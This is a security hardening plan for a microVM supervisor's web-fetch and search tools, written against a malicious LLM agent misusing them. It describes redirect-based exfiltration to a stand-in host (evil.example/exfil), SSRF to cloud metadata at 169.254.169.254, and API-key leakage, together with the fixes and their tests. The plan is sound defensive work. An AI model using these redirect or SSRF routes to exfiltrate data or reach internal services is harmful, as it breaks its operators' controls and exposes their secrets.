# Plan 65 — Phase 7 hardening: ship-to-untrusted-clients posture

**Status:** in flight (Sprint 51 follow-on)
**Owner:** mvm-supervisor + mvm-cli
**Depends on:** plan 60 Phase 7 (`feat/cloud-hypervisor-lifecycle-real`)

## Why

Phase 7 shipped fail-closed by default — empty allowlists, Noop
fetchers, `tracing::warn` + skip on any init failure. That posture
is safe **while the allowlists are empty**. Once an operator
opens them (`MVM_WEB_FETCH_ALLOWLIST=api.openai.com`,
`MVM_WEB_SEARCH_ALLOWLIST=brave`), three documented gaps + one
already-on-our-list "v0 acceptable" item become reachable. This
plan closes them before any documentation or example positions
Phase 7 as ready for untrusted MCP clients.

The threat model is "a malicious LLM agent" — Claude Code,
opencode, or a future mvmforge client constructed by an attacker.
The host is still trusted (per CLAUDE.md §"Security model →
Out of scope"). What we defend against here is an agent
attempting to exfiltrate, reach internal infrastructure, or
exhaust resources via the host-mediated tool surface.

## Threats + mitigations

### W1 — Redirect bypass of host allowlist (CRITICAL)

**Threat:** `ReqwestHttpFetcher` builds a client without setting
a redirect policy. Reqwest defaults to following up to 10
redirects. An allowlisted upstream (`api.allowed.example`) can
respond `302 Location: https://evil.example/exfil?data=...` and
the fetcher will dutifully follow — *the allowlist check only
runs once, on the original URL*.

**Mitigation:** Build the client with
`reqwest::redirect::Policy::none()`. Servers that return 3xx
land in the response (`status: 302`, `location` header in
`content-type` echo if needed) and the agent must re-call —
which goes through the allowlist again. No security-relevant
auto-follow.

**Exit test:**
`mvm_supervisor::tools::web_fetch::tests::reqwest_does_not_auto_follow_redirects`
exercises an HTTP test server that returns 302 and asserts the
returned response carries the 3xx status, not the redirect
target's body.

### W2 — SSRF via private-IP DNS resolution (CRITICAL)

**Threat:** An allowlisted hostname whose DNS later resolves to
a private IP (RFC 1918 — 10/8, 172.16/12, 192.168/16; loopback;
link-local 169.254/16; multicast). Reaches:

- Cloud metadata services (`169.254.169.254` — AWS IMDSv1,
  GCP, Azure)
- Internal control planes
- Other tenants on the same host's private network
- `localhost` services unaware they face untrusted callers

**Mitigation:**

1. Resolve the host once via the system resolver (we already
   carry `hickory-resolver` for Phase 3 — reuse).
2. Run each returned IP through `mvm-supervisor::SsrfGuard`'s
   block-list check (private + loopback + link-local + multicast
   + broadcast + unspecified).
3. If any IP is blocked, return `FetchError::Network("DNS
   resolves to a private address; refusing")` *without*
   contacting the upstream.
4. If all IPs pass, pin reqwest to the validated set via a
   custom `reqwest::dns::Resolve` impl that returns *only* those
   addresses. This closes the DNS-rebinding window between
   resolution and connection.

**Exit tests:**
- `SsrfGuard::tests::*` already exist for the IP-classification
  layer (verified before this slice ships).
- New: `web_fetch::tests::ssrf_guard_rejects_private_target_dns`
  uses a test resolver that returns `127.0.0.1` for the
  allowlisted host name and asserts the fetcher refuses.

### W3 — Body-cap overshoot (LOW)

**Threat:** `ReqwestHttpFetcher::fetch` checks
`body.len() + chunk.len() > cap` *after* the chunk has landed in
memory. A server returning chunks of size `cap + 1` writes
nearly `2*cap` bytes before the refusal. Not a security hole —
we still return `BodyTooLarge` — but reads more than the
operator's stated cap. Surprising for small caps.

**Mitigation:** Refuse the chunk *before* extending the
accumulator. Specifically: if `body.len() + chunk.len() > cap`,
return `BodyTooLarge` immediately. The chunk has already been
read into reqwest's internal buffer, but it never lands in our
accumulator and the connection is dropped on the next return.

**Exit test:** `web_fetch::tests::body_cap_is_enforced_exactly`
uses a test server returning a known body length and asserts
the accumulated body never exceeds the cap by more than zero
bytes.

### W4 — API keys in env vars → secret_store fallback (SHIPPED)

**Status (2026-05-11 — ✅ shipped):**

**Threat:** Environment variables (`BRAVE_SEARCH_API_KEY`,
`TAVILY_API_KEY`, `GOOGLE_API_KEY`, `GOOGLE_CSE_ID`) are visible
to the calling user via `/proc/<pid>/environ` (mode 0400 on
Linux, readable by uid 0 and the calling user only).

**Mitigation (shipped):** `build_tool_registry` resolves each
provider credential through `resolve_provider_credential`,
which falls back to `mvm-security::secret_store` (OS keyring
on Mac/Linux+gnome-keyring; file fallback elsewhere, mode 0600
under `~/.mvm/secrets/local/`) when the operator opts in via
the `*_FROM_SECRET` env-var pair.

Resolution order:

1. Direct value env var (`BRAVE_SEARCH_API_KEY` etc.) — wins
   when set and non-empty; preserves backward compatibility.
2. Secret-name env var (`BRAVE_API_KEY_FROM_SECRET` etc.) —
   names a secret stored via `mvmctl secret put`.
3. Otherwise — `None`; the "allowed-but-unregistered"
   config-drift error fires at invoke time.

Operator workflow (hardened posture):

```bash
mvmctl secret put brave-api-key --value-file <(cat brave.key)
mvmctl secret put google-api-key --value-file <(cat google.key)
mvmctl secret put google-cse-id --value-file <(echo $GOOGLE_CSE_ID)

export BRAVE_API_KEY_FROM_SECRET=brave-api-key
export GOOGLE_API_KEY_FROM_SECRET=google-api-key
export GOOGLE_CSE_ID_FROM_SECRET=google-cse-id
export MVM_WEB_SEARCH_ALLOWLIST=brave,google
mvmctl mcp stdio
```

Exit tests (shipped):
- `resolve_credential_returns_direct_env_var_when_set`
- `resolve_credential_returns_secret_store_value_when_direct_unset`
- `resolve_credential_prefers_direct_when_both_set`
- `resolve_credential_returns_none_when_neither_env_var_set`
- `resolve_credential_skips_empty_direct_value`
- `resolve_credential_returns_none_on_secret_store_miss`

### W5 — Google's API-key-in-URL surface (CRITICAL when Google ships)

**Threat:** Google Custom Search API requires the key in the
URL query string: `?key=<API_KEY>&cx=<CSE_ID>&q=<query>`. URLs
show up in:

- `tracing::error!` / `tracing::warn!` messages that include
  the URL on network failures
- Audit fields that capture the request URL
- Server access logs at the upstream

**Mitigation (Google-specific, ships with the provider):**

1. The constructed URL is **never** passed to `tracing` or
   audit fields. The provider builds the URL inside its
   `search()` method and discards it after the HTTP send.
2. Error wrapping uses the public surface only — provider
   name, query, status — never the URL.
3. The redacted form `https://www.googleapis.com/customsearch/v1?key=REDACTED&cx=REDACTED&q=...`
   is what surfaces in operator-visible error messages.
4. The `Debug` impl on `GoogleSearchProvider` (if any) MUST
   redact the key — same pattern `HostSigner` uses.

**Exit test:**
`web_search::tests::google_provider_error_does_not_leak_api_key`
forces the upstream to return a non-success status and asserts
the resulting `SearchError::Upstream` message does not contain
the API key string.

### W6 — Provider credential lifetime (SHIPPED)

**Status (2026-05-11 — ✅ shipped):**

**Threat:** Provider API keys (`BraveSearchProvider::api_key`,
`TavilySearchProvider::api_key`, `GoogleSearchProvider::api_key` +
`cse_id`) live as raw `String` in the provider struct. When the
provider drops, `String`'s allocator frees the heap buffer but
does NOT zero the bytes — they sit in deallocated memory until
overwritten. A memory-disclosure bug elsewhere in the supervisor
(use-after-free, oversharing of a panic backtrace, debug print,
core-dump-on-segfault) could leak the key.

The CLAUDE.md threat model accepts "the host can read its own
memory," but the LLM-agent boundary makes this a real concern:
the agent isn't strictly a host actor, and a tool-call panic
that writes a backtrace to a logger the agent reads is a
plausible exfiltration path.

**Mitigation (shipped):** Every provider credential now holds
`SecretBox<String>` (from the `secrecy` crate; same wrapper plan
63 W2 already uses across the codebase):

- `Zeroize`-on-drop: the underlying `String`'s buffer is
  cryptographically zeroed before the allocator reclaims it.
- No `Debug`/`Display`: `SecretBox<T>` deliberately doesn't
  implement either. Accidental `{provider:?}` formatting either
  fails to compile (provider's own `Debug` is hand-written +
  redacted, mirroring W5) or pins to the wrapper's own redacted
  output.
- `expose_secret()` is the only path to the inner string. The
  providers call it exactly at the wire boundary
  (`reqwest::Client::header(...)`, `query(...)`, JSON body
  construction) and never store the exposed value in a longer-
  lived binding.
- The credential-resolver pipeline in `mvm-cli` is end-to-end
  `SecretBox`: `resolve_provider_credential` returns
  `Option<SecretBox<String>>`, providers accept `SecretBox<String>`
  at construction. No intermediate `String` clone exists between
  the secret store and the wire.

**Defense vs. existing CLAUDE.md threat model:**

- W4 covers env-var visibility (`/proc/<pid>/environ`).
- W5 covers URL-embedded keys (Google) leaking through error
  messages.
- W6 covers in-process memory lifetime after the operator's
  shell init has propagated the key into the supervisor.

All three are needed: an operator with `BRAVE_API_KEY_FROM_SECRET`
configured (W4 hardened) using Google search (W5 hardened) is
still vulnerable to W6 unless the in-memory copy zeroizes on
drop.

**Exit tests:** All existing W5 tests continue to pass without
modification (Debug redaction is unchanged; SecretBox doesn't
expose). The `xtask check-no-display-on-secret-types` lint stays
clean. The W4 resolver tests continue to verify the end-to-end
secret-store pathway, now returning `SecretBox<String>` rather
than `String`.

### W7 — TLS 1.3 minimum on every reqwest client (SHIPPED)

**Status (2026-05-11 — ✅ shipped):**

**Threat:** Every Phase 7 surface that talks to an upstream
(`ReqwestHttpFetcher`, the three search providers) inherits
reqwest's TLS-version defaults. Reqwest with `rustls-tls`
historically allowed TLS 1.2 as the floor. TLS 1.2 supports
cipher suites without forward secrecy (static-RSA key exchange)
and the MAC-then-encrypt construction (which has a documented
oracle-attack history — Lucky13, etc.). Even when a *given*
upstream negotiates TLS 1.3, a downgrade-attack vector exists
during the handshake.

The threat is real but small in practice: all operator-likely
upstreams (Brave / Tavily / Google Custom Search / OpenAI /
Anthropic / Cloudflare / AWS / Azure / GCP) advertise TLS 1.3
in their `ClientHello`. The downgrade vector is closed by
pinning the floor at 1.3 explicitly.

**Mitigation (shipped):** The `http_hardening` module exports
`MIN_TLS_VERSION = TLS_1_3`; the `hardened_client_builder` sets
`.min_tls_version(MIN_TLS_VERSION)`. `ReqwestHttpFetcher`'s
per-call builder reads the same constant. A `tracing::warn` is
not needed at runtime because a TLS 1.2-only upstream would
surface a handshake-failure error to the operator.

A unit test (`w7_min_tls_version_is_pinned_at_1_3`) pins the
constant so a future refactor that loosens it (e.g. for a
one-off legacy upstream) needs to update this plan + flip the
assertion explicitly. The pin keeps the hardening posture
visible from a one-line grep.

**Trade-off accepted:** Operators talking to legacy TLS 1.2-only
upstreams hit a handshake failure. The Phase 7 use case (LLM
agent → modern API) doesn't surface any such upstream in
practice; if an operator needs one, they wrap the upstream in a
TLS 1.3 reverse proxy on the host side.

**Out of scope (deferred):**

- **Cipher-suite pinning** within TLS 1.3. rustls defaults to a
  good set (TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256,
  TLS_AES_128_GCM_SHA256). No operationally relevant attack
  shapes this further.
- **TLS 1.2 with cipher-suite filtering** as a fallback for
  legacy environments. Adds matrix complexity without a use case.

## Already-considered, not a hole

These came up during the threat survey and are documented here
so a future audit doesn't re-flag them:

- **Cookies / credential leakage:** Reqwest default doesn't
  attach a `CookieStore`. We never construct one. An upstream
  that sends `Set-Cookie` cannot persist anything across
  fetches.
- **Header injection via query params:** Reqwest URL-encodes
  query parameters; the agent cannot smuggle headers via the
  `q=` string.
- **Response header injection:** Content-type is parsed with
  `header.to_str().ok()`, which fails on non-ASCII / non-printable
  bytes and yields `None`. No CRLF smuggling.
- **TOCTOU on staging-area open:** `O_NOFOLLOW` on the actual
  read/write `open()` closes the race window at the access
  itself. The `metadata()` check before opening is for size
  reporting only — even if a symlink is swapped in between the
  metadata call and the open, the open trips ELOOP.
- **Audit log injection:** Audit fields are passed through
  `serde_json` which escapes control characters and quote
  marks correctly.
- **Cert pinning:** We use system trust roots (rustls' webpki
  bundle). Pinning specific upstream CAs is a future hardening
  if a known-pinned-cert design ever lands.

## Implementation order

| Slice | Threats | Surface | Tests | Commit |
|-------|---------|---------|-------|--------|
| 1 | W1 + W3 | `ReqwestHttpFetcher` constructor + chunk loop | redirect-policy + body-cap-exact | `bfb82c6` |
| 2 | W2 | Pre-resolve through `SsrfGuard::classify` + `PinnedDnsResolver` | ssrf-rejects-loopback/imds/rfc1918 | `5bbae28` |
| 3 | W5 | `GoogleSearchProvider` + `redact_credentials` + redacted Debug | network-error-does-not-leak-api-key | `09839ab` |
| 4 | W4 | `resolve_provider_credential` falls back to `mvm_security::secret_store` | direct-wins / fallback / miss / empty-direct | `69a5440` |
| 5 (follow-on) | W1 + W2 for providers | `http_hardening::hardened_client_builder` + `SsrfFilteringResolver` consumed by Brave/Tavily/Google | filter-passes-public / rejects-loopback/imds/rfc1918 / partial-mix | `8acbc4c` |
| 6 (follow-on) | DoS-via-huge-response | `http_hardening::read_capped` + 1 MiB default; providers parse from capped bytes | read-capped-* live-HTTP | `a437c0e` |
| 7 — W6 | Provider credential lifetime | Brave/Tavily/Google `api_key` + Google `cse_id` switch to `SecretBox<String>`; constructors require `SecretBox` at type level; `resolve_provider_credential` returns `Option<SecretBox<String>>` end-to-end (no intermediate `String` clone) | secret-types xtask + all existing tests | `6d12fc5` |
| 8 — W7 | TLS 1.3 minimum on every reqwest client | `http_hardening::MIN_TLS_VERSION = TLS_1_3`; both `hardened_client_builder` (providers) and `ReqwestHttpFetcher::build_client` (web_fetch) pin via `.min_tls_version(MIN_TLS_VERSION)` | `w7_min_tls_version_is_pinned_at_1_3` constant pin | (this commit) |

Each slice lands as a separate commit with workspace tests +
clippy `-D warnings` + secret-types xtask all clean.

## Out of scope (deferred or rejected)

- **DNSSEC validation:** Would need a validating resolver
  (hickory supports it); a follow-up if a known threat model
  demands it. Not a Phase 7 gap because the SSRF guard catches
  the only DNS-rebinding outcome we care about (private IPs).
- **mTLS to upstreams:** Provider APIs (Brave, Tavily, Google)
  are public HTTPS endpoints; mTLS isn't on offer.
- **Rate limiting per-tenant:** Cross-cutting concern, handled
  by the existing `MVM_MCP_MAX_INFLIGHT` cap on the dispatcher.
  A per-tool budget is a future slice.
